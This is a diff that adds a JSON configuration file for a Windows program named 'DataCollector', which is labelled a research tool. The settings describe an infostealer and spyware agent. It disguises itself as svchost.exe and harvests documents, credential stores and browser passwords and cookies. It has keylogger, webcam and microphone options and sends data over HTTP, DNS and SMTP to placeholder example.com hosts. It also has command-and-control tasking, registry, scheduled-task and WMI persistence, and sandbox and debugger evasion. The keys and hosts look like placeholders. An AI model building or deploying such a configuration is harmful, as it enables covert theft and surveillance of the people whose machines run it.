@@ -1,0 +1,309 @@
+{
+  "application": {
+    "name": "DataCollector",
+    "version": "2.5.0",
+    "description": "Advanced data collection and analysis tool",
+    "author": "Research Team",
+    "license": "Proprietary",
+    "build_date": "2025-05-15T04:30:00Z",
+    "update_url": "https://data-collector-updates.example.com/check"
+  },
+  "settings": {
+    "startup_delay": 30,
+    "run_on_startup": true,
+    "hide_from_taskbar": true,
+    "process_name": "svchost.exe",
+    "max_cpu_usage": 30,
+    "max_memory_usage": 256,
+    "encryption_enabled": true,
+    "encryption_algorithm": "AES-256-GCM",
+    "encryption_key": "c29tZXRoaW5nLXN1c3BpY2lvdXMta2V5LWhlcmU=",
+    "compression_enabled": true,
+    "compression_level": 9,
+    "log_level": "INFO",
+    "log_rotation": {
+      "enabled": true,
+      "max_size": 10,
+      "max_files": 5
+    },
+    "proxy": {
+      "enabled": false,
+      "type": "socks5",
+      "host": "127.0.0.1",
+      "port": 9050,
+      "username": "",
+      "password": ""
+    }
+  },
+  "collection": {
+    "enabled": true,
+    "interval": 3600,
+    "max_file_size": 10485760,
+    "targets": [
+      {
+        "type": "files",
+        "enabled": true,
+        "paths": [
+          "%USERPROFILE%\\Documents",
+          "%USERPROFILE%\\Desktop",
+          "%USERPROFILE%\\Downloads",
+          "%APPDATA%\\Microsoft\\Credentials",
+          "C:\\ProgramData\\Microsoft\\Crypto"
+        ],
+        "extensions": [
+          ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+          ".pdf", ".txt", ".rtf", ".csv", ".json", ".xml",
+          ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".zip",
+          ".pst", ".ost", ".msg", ".eml", ".vsd", ".vsdx",
+          ".sql", ".db", ".sqlite", ".accdb", ".mdb"
+        ],
+        "exclude_paths": [
+          "%WINDIR%",
+          "%PROGRAMFILES%",
+          "%PROGRAMFILES(X86)%"
+        ],
+        "max_depth": 5
+      },
+      {
+        "type": "browser",
+        "enabled": true,
+        "targets": [
+          {
+            "browser": "chrome",
+            "data": ["history", "bookmarks", "cookies", "passwords", "autofill"]
+          },
+          {
+            "browser": "firefox",
+            "data": ["history", "bookmarks", "cookies", "passwords", "formdata"]
+          },
+          {
+            "browser": "edge",
+            "data": ["history", "bookmarks", "cookies", "passwords", "autofill"]
+          }
+        ]
+      },
+      {
+        "type": "system",
+        "enabled": true,
+        "data": [
+          "hardware_info",
+          "os_info",
+          "installed_software",
+          "running_processes",
+          "network_connections",
+          "user_accounts",
+          "scheduled_tasks",
+          "startup_items",
+          "environment_variables"
+        ]
+      },
+      {
+        "type": "network",
+        "enabled": true,
+        "data": [
+          "interfaces",
+          "routing_table",
+          "dns_cache",
+          "arp_cache",
+          "hosts_file"
+        ],
+        "packet_capture": {
+          "enabled": false,
+          "interfaces": ["all"],
+          "filter": "port 80 or port 443",
+          "max_size": 104857600,
+          "max_packets": 10000
+        }
+      }
+    ]
+  },
+  "monitoring": {
+    "keylogger": {
+      "enabled": false,
+      "log_file": "%TEMP%\\kl.dat",
+      "encrypt_logs": true,
+      "capture_interval": 50,
+      "exfil_interval": 3600
+    },
+    "screenshots": {
+      "enabled": false,
+      "interval": 300,
+      "quality": 70,
+      "max_screenshots": 100,
+      "storage_dir": "%TEMP%\\sc"
+    },
+    "webcam": {
+      "enabled": false,
+      "interval": 3600,
+      "quality": 80,
+      "max_images": 24,
+      "storage_dir": "%TEMP%\\wc"
+    },
+    "microphone": {
+      "enabled": false,
+      "duration": 60,
+      "interval": 3600,
+      "quality": "medium",
+      "max_recordings": 24,
+      "storage_dir": "%TEMP%\\mc"
+    },
+    "clipboard": {
+      "enabled": false,
+      "check_interval": 5,
+      "max_size": 1048576,
+      "storage_dir": "%TEMP%\\cb"
+    }
+  },
+  "exfiltration": {
+    "enabled": true,
+    "methods": [
+      {
+        "type": "http",
+        "enabled": true,
+        "url": "https://data-collection-api.example.com/submit",
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+          "Content-Type": "application/octet-stream",
+          "X-API-Key": "c3VzcGljaW91cy1hcGkta2V5LWhlcmU="
+        },
+        "retry_count": 3,
+        "retry_delay": 300
+      },
+      {
+        "type": "dns",
+        "enabled": false,
+        "domain": "exfil.example.com",
+        "record_type": "TXT",
+        "max_length": 255,
+        "ttl": 60,
+        "retry_count": 3,
+        "retry_delay": 60
+      },
+      {
+        "type": "smtp",
+        "enabled": false,
+        "server": "smtp.example.com",
+        "port": 587,
+        "use_ssl": true,
+        "username": "exfil@example.com",
+        "password": "c3VzcGljaW91cy1wYXNzd29yZC1oZXJl",
+        "from": "exfil@example.com",
+        "to": "collector@example.com",
+        "subject_template": "Data Collection Report - %HOSTNAME% - %TIMESTAMP%",
+        "max_attachment_size": 10485760,
+        "retry_count": 3,
+        "retry_delay": 300
+      }
+    ],
+    "schedule": {
+      "type": "interval",
+      "value": 86400,
+      "jitter": 3600,
+      "max_size_per_exfil": 52428800
+    },
+    "conditions": {
+      "internet_available": true,
+      "on_battery": false,
+      "user_inactive": true,
+      "min_inactivity_time": 300,
+      "cpu_below": 30,
+      "avoid_security_software": true
+    }
+  },
+  "c2": {
+    "enabled": true,
+    "check_interval": 3600,
+    "jitter": 300,
+    "url": "https://command-control.example.com/tasks",
+    "method": "GET",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+      "X-Client-ID": "%HOSTNAME%-%USERNAME%",
+      "X-API-Key": "c3VzcGljaW91cy1hcGkta2V5LWhlcmU="
+    },
+    "commands": {
+      "collect": true,
+      "update": true,
+      "exfil": true,
+      "config": true,
+      "execute": true,
+      "download": true,
+      "upload": true,
+      "screenshot": true,
+      "keylogger": true,
+      "webcam": true,
+      "microphone": true,
+      "self_destruct": true
+    }
+  },
+  "persistence": {
+    "enabled": true,
+    "methods": [
+      {
+        "type": "registry_run",
+        "enabled": true,
+        "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "name": "SystemService",
+        "data": "%APPDATA%\\Microsoft\\Windows\\SystemService.exe"
+      },
+      {
+        "type": "scheduled_task",
+        "enabled": true,
+        "name": "SystemServiceTask",
+        "description": "System Service Maintenance",
+        "command": "%APPDATA%\\Microsoft\\Windows\\SystemService.exe",
+        "arguments": "--background",
+        "schedule": "DAILY",
+        "start_time": "12:00",
+        "user": "SYSTEM"
+      },
+      {
+        "type": "service",
+        "enabled": false,
+        "name": "SystemService",
+        "display_name": "System Service",
+        "description": "Provides system maintenance and update services",
+        "path": "%APPDATA%\\Microsoft\\Windows\\SystemService.exe",
+        "start_type": "AUTO_START"
+      },
+      {
+        "type": "wmi",
+        "enabled": false,
+        "event_filter": "__InstanceModificationEvent",
+        "namespace": "root\\cimv2",
+        "query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
+        "consumer": "%APPDATA%\\Microsoft\\Windows\\SystemService.exe"
+      }
+    ]
+  },
+  "anti_analysis": {
+    "enabled": true,
+    "detect_vm": true,
+    "detect_sandbox": true,
+    "detect_debugging": true,
+    "detect_analysis_tools": true,
+    "sleep_evasion": {
+      "enabled": true,
+      "initial_delay": 300,
+      "technique": "precision_timing"
+    },
+    "process_injection": {
+      "enabled": false,
+      "target_processes": ["explorer.exe", "svchost.exe"],
+      "technique": "createremotethread"
+    }
+  },
+  "self_protection": {
+    "enabled": true,
+    "hide_files": true,
+    "hide_registry": true,
+    "protect_process": true,
+    "watchdog": {
+      "enabled": true,
+      "interval": 60,
+      "actions": ["restart"]
+    },
+    "mutex": "Global\\DataCollectorInstance"
+  }
+}
